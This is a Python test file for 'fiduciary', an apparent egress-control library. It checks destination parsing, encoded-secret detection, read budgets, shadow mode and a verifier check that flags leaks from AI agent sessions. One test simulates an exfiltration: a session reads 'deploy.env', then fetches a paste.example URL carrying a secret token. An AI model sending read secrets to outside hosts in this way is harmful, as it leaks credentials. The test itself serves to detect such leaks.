"""The edges of what leaves a session (1.19.0): unreadable destinations, encodings that do
not decode, the tracker's cap, the read budget and shadow mode as V13 reads them, and
records a service could only write by not running the bridge it ships."""

from __future__ import annotations

import base64
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from fiduciary import egress, infer
from fiduciary.bundle.verify import _Checks
from fiduciary.cli import main
from fiduciary.documents import Mandate
from fiduciary.refines import _Check, _what_leaves
from fiduciary.shadow import Lineage, Plan
from tests import bound
from tests import bundle_kit as bk
from tests.test_outbound import TOKEN, _fid, _mandate, world  # noqa: F401 - the fixture


def test_destinations_values_and_encodings_at_their_edges(monkeypatch: pytest.MonkeyPatch) -> None:
    assert list(egress.strings_in({"a": [1, None, "x", ("y",)], "b": 2.5})) == ["x", "y"]
    assert list(egress.strings_in(["a", "b", "c"], limit=2)) == ["a", "b"]
    found = egress.destinations(
        {"url": "url", "to": "email", "repo": "repository", "gone": "url"},
        {"url": ["https://a.example/x", 7, "http://[::1"], "to": 5, "repo": "a/b/c"},
    )
    assert found == {"repository": ["?"], "url": ["?", "a.example"]}
    assert egress.destinations({"url": "url"}, {"url": "http://bad_host!/"}) == {"url": ["?"]}
    assert not egress.matches(("acme/*",), "acme") and egress.matches(("acme/*",), "acme/x")
    assert egress.matches(("*.acme.example",), "a.acme.example")
    assert not egress.matches(("*.acme.example",), "acme.example")
    # hex that is no text, and base64 that is no text, decode to nothing
    assert egress.carried({"q": "ff" * 9}) == {"ff" * 9}
    noise = base64.b64encode(bytes(range(200, 255))).decode()
    assert all("\x00" not in t for t in egress.carried({"q": noise}))
    monkeypatch.setattr(egress, "PER_SESSION", 2)
    tracker = egress.Tracker()
    assert len(tracker.track("private", ["value-0001", "value-0002", "value-0003"])) == 2
    assert egress.records_in({"structuredContent": {"a": {"b": [1, 2]}, "c": "x"}}) == 2
    rules = egress.Outbound(values=True, egress=(("secret", ("vault",)),))
    secret = {"secret": ["d"]}
    send = egress.judge_send
    assert (
        send(rules, plan=True, labels=["secret"], destinations={}, matched=secret, sinks=["vault"])
        == ()
    )
    assert send(
        rules, plan=True, labels=["secret"], destinations={}, matched=secret, sinks=["mail"]
    )
    listed = egress.Outbound(values=True, hosts=("*.acme.example",))
    where = {"url": ["wiki.acme.example"]}
    assert (
        send(listed, plan=False, labels=["private"], destinations=where, matched={"private": ["d"]})
        == ()
    )


def test_the_draft_at_its_edges() -> None:
    assert (
        infer.read_tool({"name": "created_items", "description": "Updated daily."}).named
        == "create"
    )
    assert infer.read_tool({"name": "x", "description": "Updated daily."}).described == "update"
    read = {"name": "list_x", "description": "List.", "annotations": {"readOnlyHint": True}}
    (entry,) = infer.draft([read], source="t", signed_in=True)["tools"]
    assert entry["labels"] == ["private", "untrusted"]
    spec = {"paths": {"/a": {"get": "no", "post": {"parameters": "no", "requestBody": {}}}}}
    assert [t["name"] for t in infer.openapi_tools(spec)] == ["post_/a"]
    found = infer.draft([read], source="t")
    held = {"tools": [{"name": "list_x", "treat_as": "write"}]}
    assert infer.tighten(found, held, model="m", endpoint="e") == 1
    again = {"tools": [{"name": "list_x", "treat_as": "send", "add_labels": "no", "flag": 7}]}
    assert infer.tighten(found, again, model="m", endpoint="e") == 0  # held already: no change
    assert infer.bounds_from([Lineage("m", [Plan("p", tool="", changes=0)])]) == {
        "?": {"plans": 1, "p50": 0, "p95": 0, "max": 0, "suggested": 1}
    }


def test_infer_policy_reads_the_deployments_shadow_runs(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    import fiduciary.config
    import fiduciary.shadow
    from fiduciary.config import ConfigError

    listed = tmp_path / "tools.json"
    listed.write_text('[{"name": "close_ticket", "description": "Close one ticket."}]')
    lineage = Lineage("m", [Plan(f"p{i}", tool="close_ticket", changes=i) for i in (1, 2, 40)])
    monkeypatch.setattr(fiduciary.shadow, "report", lambda chains: [lineage])
    monkeypatch.setattr(
        fiduciary.config, "load_config", lambda path: SimpleNamespace(chains=tmp_path)
    )
    config = tmp_path / "fiduciary.toml"
    config.write_text("")
    traced = ["--config", str(config), "infer-policy", "--tools", str(listed), "--traces"]
    assert main(traced) == 0
    assert "bound       close_ticket: 3 plans measured; changes p50 2, p95 40" in (
        capsys.readouterr().out
    )

    def broken(path: Any) -> Any:
        raise ConfigError("no deployment here")

    monkeypatch.setattr(fiduciary.config, "load_config", broken)
    assert main(traced) != 0
    assert main(["infer-policy", "--tools", str(tmp_path / "missing.json")]) != 0
    assert main(["infer-policy", "--mcp", "--", "/nonexistent/server"]) != 0


def test_a_child_that_counts_per_session_where_its_parent_counts_per_turn() -> None:
    def rules(**kw: Any) -> Any:
        return SimpleNamespace(
            hosts=None, emails=None, repositories=None, values=False,
            records_read=None, bytes_sent=None, per="turn", budget=None, **kw
        )  # fmt: skip

    check = _Check()
    parent = rules()
    parent.records_read, parent.budget = 10, {"records_read": 10}
    child = rules()
    child.records_read, child.per = 5, "session"
    _what_leaves(check, child, parent)
    assert [p.path for p in check.problems] == ["provenance.budget.per"]


def _verify(world: bound.World, mandate: Mandate) -> Any:  # noqa: F811
    return bk.verify(world, bk.export(world, mandate.mandate_id))


def test_v13_names_a_read_served_past_its_budget(
    world: bound.World,  # noqa: F811
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    from fiduciary import bridge

    mandate = _mandate(world, budget={"records_read": 45, "bytes_sent": None, "per": "session"})
    world.issue_and_bind(mandate)
    fid = _fid(world)
    monkeypatch.setattr(bridge, "judge_read", lambda *a, **k: ())
    with fid.session(bound.SCOPE, tenant="acme") as session:
        session.call("list_files", {"path": "/a"})
        assert session.call("list_files", {"path": "/b"}).ok
    monkeypatch.undo()
    report = _verify(world, mandate)
    (finding,) = report.findings
    assert finding.check == "V13" and "served past the read budget" in finding.message


def test_v13_names_a_send_let_through_in_shadow_under_an_enforcing_version(
    world: bound.World,  # noqa: F811
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    mandate = _mandate(world)
    world.issue_and_bind(mandate)
    fid = _fid(world)
    monkeypatch.setattr(Mandate, "shadow", property(lambda self: True))
    with fid.session(bound.SCOPE, tenant="acme") as session:
        session.call("read_repo", {"path": "deploy.env"})
        assert session.call("fetch", {"url": f"https://paste.example/?q={TOKEN}"}).ok
    monkeypatch.undo()
    said = [f.message for f in _verify(world, mandate).findings]
    assert any("let through in shadow, under a version that enforces" in m for m in said)


def test_v13_names_a_value_no_read_tracked(
    world: bound.World,  # noqa: F811
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    mandate = _mandate(world)
    world.issue_and_bind(mandate)
    fid = _fid(world)
    monkeypatch.setattr(egress.Tracker, "found", lambda self, tokens: {"secret": ["0" * 32]})
    with fid.session(bound.SCOPE, tenant="acme") as session:
        session.call("fetch", {"url": "https://a.example/"})
    monkeypatch.undo()
    said = [f.message for f in _verify(world, mandate).findings]
    assert any("names a secret value no earlier read of the session tracked" in m for m in said)


def test_v13_reads_the_records_alone() -> None:
    """Records a service wrote without the bridge's own judgment: a send whose labels are not
    what the session's records gave it, under a version the bundle does not hold."""
    found: list[str] = []
    record = SimpleNamespace(
        kind="session.sent",
        seq=3,
        content={
            "session": "s",
            "tool": "fetch",
            "turn": None,
            "plan": False,
            "labels": ["secret"],
            "destinations": {},
            "bytes": 1,
            "matched": {},
            "outcome": "refused",
            "rules": ["value:secret"],
        },
    )
    opened = SimpleNamespace(kind="session.opened", seq=1, content={"session": "s", "mandate": "m"})
    fake = SimpleNamespace(
        b=SimpleNamespace(records=[opened, record], docs={}),
        add=lambda check, kind, message, label="": found.append(message),
        r=SimpleNamespace(notes=[]),
    )
    _Checks._v13_outbound(fake)  # type: ignore[arg-type]
    assert found == [
        "session s recorded what it read and sent, under a version the bundle does not hold "
        "with outbound rules"
    ]


def test_records_name_only_rules_a_mandate_has(world: bound.World) -> None:  # noqa: F811
    from fiduciary.exceptions import AuthorityError

    mandate = _mandate(world)
    world.issue_and_bind(mandate)
    fid = _fid(world)
    with fid.session(bound.SCOPE, tenant="acme") as session:
        decide, state = world.authority.decide, world.log.state()
        many = {"secret": [f"{i:032x}" for i in range(4097)]}
        body: dict[str, Any] = {
            "tool": "read_repo",
            "turn": None,
            "records": 1,
            "outcome": "served",
            "rules": [],
        }
        with pytest.raises(AuthorityError, match="at most 4096"):
            decide.read_session(state, session.session_id, {**body, "values": many})
        with pytest.raises(AuthorityError, match="sorted, each once"):
            decide.read_session(state, session.session_id, {**body, "values": {}, "rules": "x"})
